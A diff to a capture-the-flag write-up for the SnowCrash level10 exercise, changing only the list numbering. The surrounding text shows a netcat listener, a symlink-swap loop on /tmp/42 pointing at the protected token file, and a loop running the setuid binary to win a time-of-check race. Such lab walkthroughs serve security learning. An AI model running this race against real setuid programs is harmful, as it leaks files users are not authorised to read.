@@ -78,19 +78,19 @@ The binary check first if our user can read the file and then open it and write 
 We can exploit a **race condition** because the socket thinks are executed after the access and it take long time.
 To do this we need to:
 
-1- Listen with netcat
+1. Listen with netcat
 
 ```bash
 level10@SnowCrash:~$ while true; do nc -l 6969 | grep -v ".*( )*."; done
 ```
 
--2 Create a file where we can access / delete it / create a symlink between the file and token:
+2. Create a file where we can access / delete it / create a symlink between the file and token:
 
 ```bash
 level10@SnowCrash:~$ while true; do touch /tmp/42; rm -rf /tmp/42; ln -s $PWD/token /tmp/42; rm -rf /tmp/42; done
 ```
 
-3- Send `/tmp/42` to the server a lots of times:
+3. Send `/tmp/42` to the server a lots of times:
 
 ```bash
 level10@SnowCrash:~$ while true ; do ./level10 /tmp/42 0.0.0.0 2> /dev/null; done
